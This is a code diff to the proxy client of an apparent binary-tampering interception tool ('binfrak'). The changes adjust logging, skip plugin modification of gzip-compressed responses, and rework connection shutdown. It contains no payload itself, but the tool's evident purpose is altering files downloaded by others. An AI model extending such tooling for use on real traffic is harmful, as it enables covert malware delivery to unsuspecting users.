@@ -7,6 +7,7 @@ class ProxyClient(proxy.ProxyClient):
 
     def __init__(self, command, rest, version, headers, data, father):
         self.father = father
+	self.client = father
         self.command = command
         self.rest = rest
         self.headers = headers
@@ -21,7 +22,7 @@ class ProxyClient(proxy.ProxyClient):
         plugins = binfrak.loadPlugins()
         if key.lower() == 'content-encoding':
             if value.find('gzip') != -1:
-                logging.debug("Response is compressed...")
+                log.msg("Response is compressed...")
                 self.isCompressed = True
 
         if key.lower() == 'content-length':
@@ -35,21 +36,30 @@ class ProxyClient(proxy.ProxyClient):
 
         proxy.ProxyClient.handleHeader(self, key, value)
 
-    def handleResponse(self, data):
+    def handleResponsePart(self, data):
+	log.msg("Response handler")
         if self.isCompressed:
-            log.msg("Decompressing content...")
-            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
+            log.msg("compressed skipping")
+            #self.client.write(data)
+            #self.shutdown()
+            #return
+            #data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
 
         #log.msg( "Read from server:\n" + data)
         #frak with bin files here.
-        if self.plugin:
+        if self.plugin and not self.isCompressed:
+	    log.msg("Plugin running...")
             data = self.plugin.frak(data)
 
         if self.contentLength != None:
             self.client.setHeader('Content-Length', len(data))
 
         self.client.write(data)
-        self.shutdown()
+        #self.shutdown()
+
+    def shutdown(self):
+         self.client.finish()
+         self.transport.loseConnection()
 
 
 
